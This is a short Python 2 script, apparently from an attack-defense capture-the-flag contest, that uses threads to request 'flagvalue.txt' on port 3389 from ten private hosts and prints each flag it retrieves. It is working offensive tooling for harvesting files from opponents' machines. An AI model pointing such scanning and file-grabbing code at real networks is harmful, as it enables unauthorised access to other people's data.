import urllib
import threading

def get(ip):
    try:
        url="http://"+ip+":3389/flagvalue.txt" 
        flag = urllib.urlopen(url).read()
        print ip+' flag:'+flag
    except Exception,e:
       pass
       #print e

if __name__=="__main__":
    for i in range(100,110):
        ip='192.168.'+str(i)+'.141'
        q=threading.Thread(target=get,args=(ip,))
        q.start()
        
